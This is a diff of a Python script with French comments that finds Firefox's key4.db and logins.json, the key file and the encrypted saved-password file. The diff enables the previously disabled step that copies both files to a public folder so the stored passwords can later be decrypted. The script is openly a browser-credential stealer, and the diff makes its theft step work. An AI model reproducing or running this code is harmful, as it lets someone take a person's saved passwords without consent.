@@ -3,8 +3,9 @@ from pathlib import Path
 
 #mets dans cette variable ton nom d'utilisateur (va dans C:\Users pour le trouver)
 NomDUtilisateur = "user"
-
-
+#mets ici l'endroit ou tu veux retrouver les fichiers
+#merci de remplacer les \ part deux \\ car sinon cela ne fonctionne pas
+FilePath = "C:\\Users\\Public\\Documents"
 
 
 
@@ -13,7 +14,6 @@ fKeyName = "key4.db"
 fLoginPath = "C:\\Users\\" + NomDUtilisateur + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\i4orzey3.default-release\\logins.json"
 fLoginName = "logins.json"
 
-#FilePath = "C:\Users\Public\Documents"
 
 
 print("[+] recherche des fichiers")
@@ -76,17 +76,21 @@ else:
     print("%APPDATA%\Mozilla\Firefox\Profiles")
     
 time.sleep(1)
+
+
 #systeme de copie-colle
-if File == True and 0 == 1:
+if File == True:
     try:
-        #filePathKey = shutil.copy(fKey,FilePath)
+        filePathKey = shutil.copy(fKeyPath,FilePath)
         print("[+] le fichier avec la clé déchiffrement à été copier")
+        time.sleep(1)
     except:
         print("[-] le fichier avec la clé de déchiffrement n'a pas été copier")
         print("    Merci de vérifier si le chemin entrer est le bon")
     try:
-        #filePathLogin = shutil.copy(fLogin,FilePath)
+        filePathLogin = shutil.copy(fLoginPath,FilePath)
         print("[+] le fichier avec les mots de passe crypter à été copier")
+        time.sleep(1)
     except:
         print("[-] le fichier avec les mots de passe crypter n'a pas été copier")
         print("    Merci de vérifier si le chemin entrer est le bon")
